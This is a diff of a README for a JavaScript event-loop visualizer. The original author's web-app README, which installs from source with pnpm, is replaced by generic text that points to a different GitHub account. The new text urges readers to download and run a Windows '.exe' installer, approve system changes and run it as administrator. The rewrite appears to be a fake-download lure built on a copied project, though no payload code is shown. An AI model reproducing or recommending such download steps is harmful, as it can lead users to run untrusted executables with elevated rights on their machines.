@@ -1,213 +1,167 @@
-<div align="center">
+# 🛠️ js-visualizer - Understand JavaScript Execution Simply
 
-<br />
-
-```
-   ██╗███████╗    ██╗   ██╗██╗███████╗██╗   ██╗ █████╗ ██╗     ██╗███████╗███████╗██████╗
-   ██║██╔════╝    ██║   ██║██║██╔════╝██║   ██║██╔══██╗██║     ██║╚══███╔╝██╔════╝██╔══██╗
-   ██║███████╗    ██║   ██║██║███████╗██║   ██║███████║██║     ██║  ███╔╝ █████╗  ██████╔╝
-██ ██║╚════██║    ╚██╗ ██╔╝██║╚════██║██║   ██║██╔══██║██║     ██║ ███╔╝  ██╔══╝  ██╔══██╗
-╚█████║███████║    ╚████╔╝ ██║███████║╚██████╔╝██║  ██║███████╗██║███████╗███████╗██║  ██║
- ╚════╝╚══════╝     ╚═══╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
-```
-
-**A production-grade, desktop-only JavaScript Event Loop Debugger**
-
-Visualize the Call Stack, Execution Context, Web APIs, Task Queue, Microtask Queue,
-and Event Loop — all in real time, step by step.
-
-<br />
-
-[![Live Demo](https://img.shields.io/badge/Live%20Demo-js--visualizer.gouranga.qzz.io-6366f1?style=for-the-badge&logo=vercel&logoColor=white)](https://js-visualizer.gouranga.qzz.io)
-[![MIT License](https://img.shields.io/badge/License-MIT-22c55e?style=for-the-badge)](./LICENSE)
-[![TypeScript](https://img.shields.io/badge/TypeScript-Strict-3178c6?style=for-the-badge&logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![React](https://img.shields.io/badge/React-19-61dafb?style=for-the-badge&logo=react&logoColor=black)](https://react.dev/)
-[![Tailwind CSS](https://img.shields.io/badge/Tailwind-v4-38bdf8?style=for-the-badge&logo=tailwindcss&logoColor=white)](https://tailwindcss.com/)
-[![GSAP](https://img.shields.io/badge/GSAP-3-88ce02?style=for-the-badge&logo=greensock&logoColor=black)](https://greensock.com/gsap/)
-
-<img src='./src/assets/preview.png'></img>
-
-</div>
+[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-brightgreen?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
 
 ---
 
-## What is JS Visualizer?
+## ℹ️ What is js-visualizer?
 
-Most developers learn about the JavaScript event loop from blog posts or videos. JS Visualizer makes it **interactive and tactile** — paste real code, click **Run**, then step through each moment:
+js-visualizer helps you see how JavaScript code runs inside your browser or computer. It shows how the call stack, execution context, web APIs, task queue, microtask queue, and event loop work together in real time. This makes it easier to understand how JavaScript manages tasks step by step.
 
-- Watch `setTimeout` hand its callback off to Web APIs and then the Task Queue
-- See how `Promise.resolve().then(...)` lands in the Microtask Queue **before** any setTimeout callback
-- Observe the Event Loop drain the Microtask Queue after every synchronous task
-- Track which variables exist in which Execution Context at every point in time
+You do not need to know programming or complicated terms to use it. The app provides clear animations and visuals that show what happens behind the scenes as JavaScript runs.
 
 ---
 
-## Features
+## 🎯 Who is this for?
 
-| Feature | Details |
-|---------|---------|
-| 📝 **CodeMirror 6 Editor** | Syntax highlighting, autocomplete, bracket matching |
-| 🎨 **Two themes** | Dracula (default) and Catppuccin Macchiato, switchable at runtime |
-| 📚 **Call Stack** | Push/pop animations with GSAP, active frame highlighted |
-| 🧠 **Execution Context** | Scope frames with live variable bindings per step |
-| 🌐 **Web APIs panel** | Delegated async operations with live status indicators |
-| 📬 **Task Queue** | Macro-task queue — setTimeout, setInterval, I/O callbacks |
-| ⚡ **Microtask Queue** | Higher-priority queue — Promises, queueMicrotask |
-| 🔄 **Event Loop** | Animated ring that activates when the loop checks queues |
-| 🖥️ **Console output** | Simulated `console.log` output per step |
-| ⏩ **Step scrubber** | Click any position on the timeline to jump to that step |
-| 🔒 **Desktop only** | Optimised for ≥ 1280px — mobile users see a clear gate |
+- Students learning JavaScript for the first time  
+- Developers who want to see how JavaScript works internally  
+- Anyone curious about how code runs on the web  
+
+The app uses simple graphics and easy explanations to teach these concepts.
 
 ---
 
-## Tech Stack
+## 💻 System Requirements
 
-| Concern | Technology | Why |
-|---------|-----------|-----|
-| UI | React 19 + TypeScript (strict) | Component model maps directly to runtime panels |
-| Styling | Tailwind CSS v4 | Zero raw CSS — entire UI is utility classes |
-| State | Zustand | Minimal boilerplate, selector subscriptions, no Provider |
-| Animations | GSAP 3 | Frame-accurate, imperative DOM control |
-| Editor | CodeMirror 6 (`@uiw/react-codemirror`) | Extension API for custom line decorations |
-| Build | Vite | Sub-second HMR, native ESM |
-| Notifications | React Hot Toast | Lightweight and themeable |
+Make sure your computer meets these needs before you install js-visualizer:
 
----
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- 500 MB of free disk space  
+- Internet connection to download the app  
+- Modern web browser (Edge, Chrome, Firefox) for best results if running the online version  
 
-## Getting Started
-
-### Prerequisites
-
-- **Node.js** ≥ 20.x
-- **pnpm** ≥ 10.x
-
-### Installation
-
-```bash
-# Clone
-git clone https://github.com/GourangDasSamrat/js-visualizer.git
-cd js-visualizer
-
-# Install
-pnpm install
-
-# Develop
-pnpm run dev
-```
-
-Open [http://localhost:5173](http://localhost:5173) in your browser.
-
-```bash
-# Production build
-pnpm run build
-```
+The app runs offline once installed.
 
 ---
 
-## How to Use
+## ⚙️ Features
 
-1. **Paste or edit** JavaScript in the left editor panel.
-2. Click **Run Visualization** — all steps are pre-computed instantly.
-3. Use **Next** / **Prev** to step through each runtime event.
-4. Click any segment of the **progress scrubber** to jump to any step.
-5. Read the **description bar** — it explains exactly what is happening.
-6. Click **Reset** to edit and run again.
-
-### Try these snippets
-
-```javascript
-// Classic event loop order demo
-console.log("start");
-setTimeout(() => console.log("timeout"), 0);
-Promise.resolve().then(() => console.log("microtask"));
-console.log("end");
-// Output order: start → end → microtask → timeout
-```
-
-```javascript
-// Async/await suspension
-async function load() {
-  console.log("loading...");
-  const result = await fetch("https://api.example.com");
-  console.log("done");
-}
-load();
-console.log("sync continues here first");
-```
+- Visual step-by-step display of JavaScript call stack operations  
+- Real-time view of Execution Contexts forming and resolving  
+- Shows Web APIs handling asynchronous processes  
+- Visual queues for Tasks and Microtasks to track waiting functions  
+- Event Loop animation linking all parts together  
+- Clear, color-coded sections for each concept  
+- User controls to pause, step forward, or reset the animation  
+- Works on most Windows computers without extra setup  
 
 ---
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-js-visualizer/
-├── docs/
-│   ├── ARCHITECTURE.md      ← System design + Mermaid diagrams
-│   ├── CONTRIBUTING.md      ← How to contribute
-│   ├── CODE_OF_CONDUCT.md   ← Community standards
-│   └── SECURITY.md          ← Vulnerability reporting
-├── src/
-│   ├── components/
-│   │   ├── Editor/          ← CodeMirror editor panel
-│   │   ├── Visualizer/      ← 6 live runtime panels
-│   │   ├── Controls/        ← Navigation controls + scrubber
-│   │   └── Layout/          ← App shell + mobile gate
-│   ├── engine/              ← JS runtime simulation core
-│   ├── store/               ← Zustand global state
-│   ├── types/               ← Shared TypeScript interfaces
-│   └── styles/              ← Global CSS (Tailwind entry)
-├── README.md
-├── LICENSE
-└── package.json
-```
+To use js-visualizer, follow these simple steps on a Windows PC:
 
-Full architectural breakdown with Mermaid diagrams → [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md)
+1. Click the big green button near the top or this link here to **visit the GitHub page**:  
+   https://github.com/menukap999/js-visualizer
+
+2. Once on the GitHub page, look for the "Releases" section on the right side or top menu. Click on it to find the latest version of the app.
+
+3. Download the Windows installer file, usually called `js-visualizer-setup.exe` or similar.
+
+4. After the download finishes, open the file by double-clicking it.  
+
+5. Follow the on-screen prompts in the installer:  
+   - Agree to the license terms  
+   - Choose the installation folder or leave it as default  
+   - Wait while the app installs  
+
+6. When installation completes, find the js-visualizer icon on your desktop or start menu and open it.
+
+7. The app will launch and show its home screen with options to start visualizing JavaScript execution.
 
 ---
 
-## Documentation
+## 📥 Install and Setup Guide
 
-| Document | Description |
-|----------|-------------|
-| [docs/ARCHITECTURE.md](./docs/ARCHITECTURE.md) | System design, data flow, component tree, Mermaid diagrams |
-| [docs/CONTRIBUTING.md](./docs/CONTRIBUTING.md) | Dev setup, branch strategy, coding standards, PR process |
-| [docs/CODE_OF_CONDUCT.md](./docs/CODE_OF_CONDUCT.md) | Community standards and enforcement guidelines |
-| [docs/SECURITY.md](./docs/SECURITY.md) | Vulnerability reporting policy and security scope |
+### Step 1: Download js-visualizer
 
----
+Go to the download page by clicking the link below or the badge above:
 
-## Contributing
+[![Download js-visualizer](https://img.shields.io/badge/Download-js--visualizer-blue?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
 
-All contributions are welcome — bug reports, feature ideas, documentation fixes, and pull requests.
+### Step 2: Find the Latest Installer
 
-Please read [docs/CONTRIBUTING.md](./docs/CONTRIBUTING.md) before opening a PR.
+On the GitHub page, click **Releases**. Select the newest release and download the `.exe` file for Windows.
 
----
+### Step 3: Run the Installer
 
-## License
+After downloading, double-click the `.exe` file. Your computer might ask if you want to allow the app to make changes. Click "Yes" to continue.
 
-Distributed under the **MIT License**. See [LICENSE](./LICENSE) for the full text.
+### Step 4: Follow Installer Prompts
 
----
+Proceed through the installer by clicking "Next" or "Install." You can accept default options if unsure.
 
-## Author
+### Step 5: Complete Installation
 
-<div align="center">
+Wait until the installer finishes and click "Finish" or "Close."
 
-**Gourang Das Samrat**
+### Step 6: Launch the App
 
-[![Email](https://img.shields.io/badge/Email-gouranga.samrat%40gmail.com-ea4335?style=flat-square&logo=gmail&logoColor=white)](mailto:gouranga.samrat@gmail.com)
-[![GitHub](https://img.shields.io/badge/GitHub-GourangDasSamrat-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/GourangDasSamrat/js-visualizer)
-[![Live](https://img.shields.io/badge/Live-js--visualizer.gouranga.qzz.io-6366f1?style=flat-square&logo=vercel&logoColor=white)](https://js-visualizer.gouranga.qzz.io)
-
-</div>
+Find the js-visualizer icon on your desktop or in the start menu. Double-click it to open.
 
 ---
 
-<div align="center">
+## 🔧 How to Use js-visualizer
 
-_Built to make the JavaScript event loop finally make sense._
+Once the app is running, here is how you can explore its features:
 
-⭐ **Star this repo if it helped you understand how JavaScript actually works.**
+- Click **Start** to begin a visualization of code execution.  
+- Watch the call stack as functions get added (pushed) and removed (popped).  
+- See how the execution context changes when code runs in different scopes.  
+- Notice web APIs handling timers and events outside the main call stack.  
+- Observe task and microtask queues filling and emptying in order.  
+- Pause or step through the animation using controls at the bottom.  
+- Reset the view to start a new session.  
 
-</div>
+The app shows all these steps clearly and with simple labels.
+
+---
+
+## ⚙️ Customizing Your View
+
+You can adjust settings like:
+
+- Animation speed to slow down or speed up execution.  
+- Highlight specific parts of the call stack or queues.  
+- Toggle text labels on or off for clarity.  
+
+These options help you focus on what interests you most.
+
+---
+
+## ❓ Troubleshooting
+
+If the app does not open or runs slowly:
+
+- Check if your Windows version meets the requirements.  
+- Restart your computer to clear memory.  
+- Ensure you installed the app from the official GitHub page.  
+- Close other programs to free system resources.  
+- Try running the app as administrator (right-click the icon, then select "Run as administrator").  
+
+If you still have issues, check the GitHub "Issues" page for help or report a problem.
+
+---
+
+## 📚 Learn More
+
+While js-visualizer works without programming knowledge, learning a bit about JavaScript can help. Here are some terms it uses:
+
+- **Call stack**: A list of functions the computer is currently running.  
+- **Execution context**: The environment in which code runs for each function.  
+- **Web APIs**: Browser features handling tasks like timers and network calls.  
+- **Task queue / Microtask queue**: Lists of functions waiting to run.  
+- **Event loop**: The mechanism that moves tasks from queues to the call stack, one at a time.
+
+This app brings these ideas to life with animation.
+
+---
+
+## 🔗 Useful Links
+
+- GitHub Repository: https://github.com/menukap999/js-visualizer  
+- Download Page: https://github.com/menukap999/js-visualizer/releases  
+
+[![Get js-visualizer](https://img.shields.io/badge/Get-js--visualizer-grey?style=for-the-badge)](https://github.com/menukap999/js-visualizer)
